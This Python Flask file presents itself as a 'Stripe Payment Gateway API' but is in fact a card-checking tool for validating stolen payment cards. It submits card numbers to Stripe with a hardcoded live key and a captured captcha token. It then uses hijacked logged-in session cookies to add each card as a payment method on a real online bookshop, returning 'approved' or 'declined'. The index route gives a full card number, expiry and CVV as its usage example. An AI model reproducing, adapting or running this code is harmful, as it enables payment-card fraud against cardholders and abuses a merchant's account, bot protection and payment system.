# app.py
from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def parse_card_data(card_string):
    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
    parts = card_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
    
    card_no, month, year, cvv = parts
    
    # Clean and format card number (remove spaces and special characters)
    card_no = re.sub(r'\s+', '', card_no)
    card_no = re.sub(r'[^\d]', '', card_no)
    
    # Format year (if 4-digit, take last 2)
    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Year should be 2 or 4 digits")
    
    # Ensure month is 2 digits
    month = month.zfill(2)
    
    # Validate CVV
    cvv = re.sub(r'[^\d]', '', cvv)
    
    return card_no, month, year, cvv

def format_card_number(card_no):
    """Format card number with spaces for display"""
    groups = []
    for i in range(0, len(card_no), 4):
        groups.append(card_no[i:i+4])
    return ' '.join(groups)

@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
def stripe_payment(site, card_data):
    try:
        # Parse card data
        card_no, month, year, cvv = parse_card_data(card_data)
        formatted_card = format_card_number(card_no)
        
        # First Stripe API request
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        # Construct the data payload with the provided card details
        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F{site}&time_on_page=32174&client_attribution_metadata[client_session_id]=1f57d457-dc2c-4e6d-8b80-f59cfe019b27&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=996bc306-a8d8-4e33-a84f-8621ac36171e&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=e98e75fe-0fff-406c-87eb-7a698336d1000abe71&sid=53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc&key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY1NDczMTY1LCJjZGF0YSI6Ijhad1dTMktFVGkvZld6b2ZFWmR2YXpldmhpRjhWTFhvZ3hYQlhKR0hWaDBWUkFPMjUwcjE0Y2NGcjFqYitkS0c1UFJ6RFg0ekFDbUpXUFhiQmt4bU5XQUtGRERLWXdXVURSeVQ5ZTVBSmpVcy9TOWJDdU9PbzNESGZzNzMwYjZLQTVhMExYVTJERHUzNHh6OGhsTTBPYXVWZ3UxZXlwcWhuT3I3SjFNV3JUdWdUSVQxRFlVaTJOSU1GcFFCekZxcWxqOXB6V0k5bWxYZTRsN3ciLCJwYXNza2V5IjoiZnNjdSsxbGVKKzZnRkhXOHVteUZsbldrM2FjYlBZekFJSkVKNzUrcGtvNzhRNGJGS3BmYk5FdkNyU2ZxS0VKWlpsK0Q5dTVKS3lySXZ6NlI0T3BWMEtOUGcwVXRhVDhYbUIxdHdTYjJ3VEVHMXdvMFVsNnoyRjVFRTVGWkVGSGxJL3phUXVZeVcwbjJsd3lpckhyaGRpcHZ1MzBxSlBmRVpNZzlvMmdnK2NwOHQ3dHJGSDNkMDV4NWFzUkpqcEpLVnp0cTBuMzBaZTlwM2JLdjgrQkdiVVkyZnd2L1VKOGtzSmFRd2kxc1NYOWhiZ1lDV0FpUzgwcHhlSjF5TWhib2dRbWFhamlSajBiT2t4TTFmRUFST284R2FHVlBneGpGNXpJK1V3RFpBMFhFQVlBTFRuZ0RVMHNiM1JZeGl0Sjc0VlNPNlA4TGFjLzk3Zy9NL1dZOHlacSt1WGhDenE0SENGT0V3Tnk3RStqNjQ5Q0djcjB0QVJBM0oyMXI1ZUM3ZFFFZWtJRHRONjdHOXNQeDAzTCt2N21EYk1XZnlvLzAra2NGeHBnQ0EwSEgrT3BPOGUvRlpUR3J2TVVOR3JqRXZ1d2gzMFRQcWxySzB6TVVSN1NSMWdUeGJ5YnY1V3N6VUpqdCtvcnhwZmU5U3gxMmNxUnFuL1FrOFA4cXBhUzBCaE9DV01TRm9pNmhKVFlmRDh4QmFZdkpKQUdFbnJxYTMwb1BaMy9QRlRhYXZiNzl1MlFlTVpaYVlGcXpJSkZ2SG5PbFBDUkZnZjNkUFR4ZytVL0ZwWXFiV3RHS0lyczdqTHdHVW16cEI2RWJYa0dUWGJiL3ZkaWxIc2xwbS9qRzZ0WmttWmc4T3Ixd0NZbktXTSthMmw1azBOazRPV0VHQmFGM1VDcWV2SVhLU2N0NmNYYjNMVUFCaGdIaytMcnNybGY0T0NCL3pnVU1hWHBEa0JRQ3JFVHk1WExaSjUxN1BYOWRQVVpxb3dkc3dUR3k0c3A1dkhDSzBTeUZsRTlBWExtbW9nOGliTEFtZTZxcURFVHZYWGZuVXF2bVRRb0NQVjZnb3dJZkZsNlpXam5XbXVvZkxOeVRWbEMzbTlPV3hLUlJqOVZSeElOb0xKcCt5RWtpdXlhZHk4cVlVd3VkYmt4c0dvM092N0hHblF0NytuNGt4K1lIMjF1eklMRW1xTjB3WFozVy9TbWpXK1g2a0hveDhoMGhkTDg5WkJFa2VXNjhPVmQxUXNyUFpUbVgwY0srMWtJSy90WlpmTDRhc00vQm44TVZpUWZqUVJqMHFZMWZlNllkS2VPY0VHRWFYOXk1VVFwNEVuaE5RR2FlN284WjcyTzh6cngvVU5xMlFtSS9lUzBmR3ZPM3l3bWFXT0R2NGVsdWFpV2RrVWNKY0pyc3k0dFpSUXBackN5M3pCR1JDR1lyaVh4TFNBdisyWnhkeDhIRjBPOWlnbFJhcGgrdnJjNWpQNzR6UVdGdlZIV3dZaWhwUjJXaDM3YWtZa0hpZkI1eElQTmIrQjIrOWZ1NmRjKzhIemdNaVZheXZGOGVBRDFvNkxxOUF1TmtQUWNIbzNDVzFpalZHT2xtWTQ2NUNGRmpJbklqbCtTNHk1Q0tyMWszSWJDYklJTFRFcUVaRERWcU9IY2FuTks1cjZ2dkY4RWNpWHU0ZHRtcTVaNzQ3TFBqQkZJK2oycUNkNSs0enRXUGN0eTNta2N4eXc2Lzhxanl1UTlpN3V6MzFnUHdoU3J3Rm41WHQ1NXVKRGJ5VlA4QkorVklBckNtQnNkYnJqM2NZZTA4WWMyamJ1Mkx1Z21TbHYrd1MyaWlQNldWVTdvZjV1QUZ0UERweGFMZU9BYTViNnB4L3JiSnQrcmNhYUpaZDFXQUkwd2w4ZlBlL1duVHJQZzIzQzIwRy9IOFkvUHhkejE4UEtkOXUzNWJ1NTFFV2dYWHgxWEs3WmVsRUNvdXZoZVZ4NCtwRnJKVGMvV2YyT3F6MkNyNVhKWTlYWnJEVlR0Y0xyOVVvNGNhQ2tYL2lhZHZFZ2ZsZXFzNExENGh1Yk12K1M3a0J6SHVMVEhmc3J0eU1DdUY1TjMzL2hkandTQ05Tamo4a3Ntckpyenp1TVA0bURmY3hsOGxBZm52bkZaZUVERFVXdzlOK2ptSUtMV2ZmQ3Z4dFdrblhRelIxTHRKOG5leEdmUnNiR0Q0N0s5RklGODFCTEduMFh2Y1pwUXNJQS9ORGdwOEtYR1pBUWlxN0lNZGRkKzBzd3BDRkIzQUJhNHJHd2lzd1p2WjZhaWZyZFFhcGIzNmRCS01aUVBEWDY1MU50WmxTdktVZDN3c25aMisvZEJtbGtLQVp2V1ZuSGlWck1yZ0ZCUEJ5RVlRcFh4QjZHZHQyYmVmNHRIS2xjSjFlM1RudmFhdTZ1K2VURFl1M2ltZFVkV291OFFCSm1TcTEwQ0d2SDNXVEh6eEs2aFJDMUZLTHFzQ3pOU29JNGlzV0IvZTBFRkcxNnFqL2VTK1RnVnMvRE54ZHBPbzB1VExWMVJzQkFsbkU1eGIvOFdFQXlrY1Axc3EvQXQ1Iiwia3IiOiIyYjIxODkwYyIsInNoYXJkX2lkIjoyNTkxODkzNTl9.pBWEza2uRyGft4lwP9sJ3CW45qMteoUjXbKLxbNQ91c'

        # Make first request to Stripe
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )

        if stripe_response.status_code != 200:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined'
            }), 200

        stripe_data_response = stripe_response.json()
        payment_method_id = stripe_data_response.get('id')
        
        if not payment_method_id:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined'
            }), 200

        # Second request to the merchant site
        site_cookies = {
            'wordpress_sec_438871b33c89e20b4b6c9d95b7b1eddf': 'wizardlyaura999%7C1765788431%7ClVcaBWa7NVi7uQn47AJ1NX5v7klwfgmQYY5xt0TZCCS%7Cc9fe950da42037d989112bc2b303c298d4cafd418449fdae53696bf3f8bb80a6',
            '_ga': 'GA1.1.242133832.1764575859',
            '_hjSessionUser_3261952': 'eyJpZCI6ImIyN2Y3Y2VlLWU4NDctNWNiZS1hNjg2LWY2ZmUxM2NhNTVjYiIsImNyZWF0ZWQiOjE3NjQ1NzU4NjA4MDMsImV4aXN0aW5nIjp0cnVlfQ==',
            'hubspotutk': 'f1dee68925d61cf3b3d89818b575abf4',
            '_fbp': 'fb.1.1764575861928.682738287201334136',
            '__stripe_mid': 'e98e75fe-0fff-406c-87eb-7a698336d1000abe71',
            '_gcl_au': '1.1.1430257312.1764575862.1483529673.1764578695.1764578830',
            'wordpress_logged_in_438871b33c89e20b4b6c9d95b7b1eddf': 'wizardlyaura999%7C1765788431%7ClVcaBWa7NVi7uQn47AJ1NX5v7klwfgmQYY5xt0TZCCS%7Cd2bc0575279d6372f7bb9402c47d0d07af9a8ca268265f0dadc119136be30fe1',
            '_monsterinsights_uj': '{"1764575860":"https%3A%2F%2Fbookshop.multilit.com%2F%7C%23%7CHome%20-%20Multilit%20Bookshop%7C%23%7C189","1764575867":"https%3A%2F%2Fbookshop.multilit.com%2Fproduct%2Fthe-spotty-sock-mystery%2F%7C%23%7CThe%20Spotty%20Sock%20Mystery%20-%20Multilit%20Bookshop%7C%23%7C1458","1764575879":"https%3A%2F%2Fbookshop.multilit.com%2Fcheckout%2F%7C%23%7CCheckout%20-%20Multilit%20Bookshop%7C%23%7C62","1764575900":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764575938":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764575943":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578622":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578719":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578726":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%3Freset-link-sent%3Dtrue%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578744":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578765":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%3Fpassword-reset%3Dtrue%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578795":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578857":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578863":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294028":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294032":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294063":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294071":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454"}',
            'wfwaf-authcookie-68e65641b1fed02c6bf278f47042f532': '175031%7Cother%7Cread%7C9027e43263e0c78f62ba81c54b6dda58ba9fc0539f04e4cf8b6a87332ddd17df',
            '__cf_bm': 'FIPqFE__im4yxCILgfear5yVUpTH5L618mFvRFlereI-1765473036-1.0.1.1-TBf988Mm9dL8AJZhYL_0vUzMYBMlcRQYzjkD6zaCsf71fX5CsnYXW._xI_8xY.QuReOAHscZ2bxqPA5BQFS1B7go8f8XKaTOCP_MJ9TdeUk',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_first_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F',
            '_hjSession_3261952': 'eyJpZCI6IjRmOTc3OTQ5LTk3ZGYtNGEyYy05NGU2LTIwNjE2MDQ5Y2M0YyIsImMiOjE3NjU0NzMwMzc2NjksInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
            '__hstc': '77795275.f1dee68925d61cf3b3d89818b575abf4.1764575861088.1765294028613.1765473039486.4',
            '__hssrc': '1',
            '__hssc': '77795275.1.1765473039486',
            '__stripe_sid': '53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc',
            '_ga_CVFG3GFJ51': 'GS2.1.s1765473036$o4$g0$t1765473067$j29$l0$h0',
        }

        site_headers = {
            'authority': site,
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://{site}',
            'referer': f'https://{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '7817991406',
        }

        # Make second request to merchant site
        site_response = requests.post(
            f'https://{site}/wp-admin/admin-ajax.php',
            cookies=site_cookies,
            headers=site_headers,
            data=site_data
        )

        # Check if the site response indicates success
        try:
            site_response_json = site_response.json()
            # Check for success indicators in the response
            if site_response.status_code == 200:
                # Look for success indicators in the response
                response_str = str(site_response_json).lower()
                if any(success_indicator in response_str for success_indicator in [ 'succeeded', 'active', 'true', 'paymentmethod']):
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully'
                    }), 200
                else:
                    return jsonify({
                        'status': 'declined',
                        'response': 'card was declined'
                    }), 200
            else:
                return jsonify({
                    'status': 'declined',
                    'response': 'card was declined'
                }), 200
        except:
            # If JSON parsing fails, check status code
            if site_response.status_code == 200:
                return jsonify({
                    'status': 'approved',
                    'response': 'payment method added successfully'
                }), 200
            else:
                return jsonify({
                    'status': 'declined',
                    'response': 'card was declined'
                }), 200

    except ValueError as e:
        return jsonify({
            'status': 'declined',
            'response': 'card was declined'
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'declined',
            'response': 'card was declined'
        }), 200

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe Payment Gateway API',
        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
        'response_format': {
            'approved': {'status': 'approved', 'response': 'payment method added successfully'},
            'declined': {'status': 'declined', 'response': 'card was declined'}
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1100, debug=True)
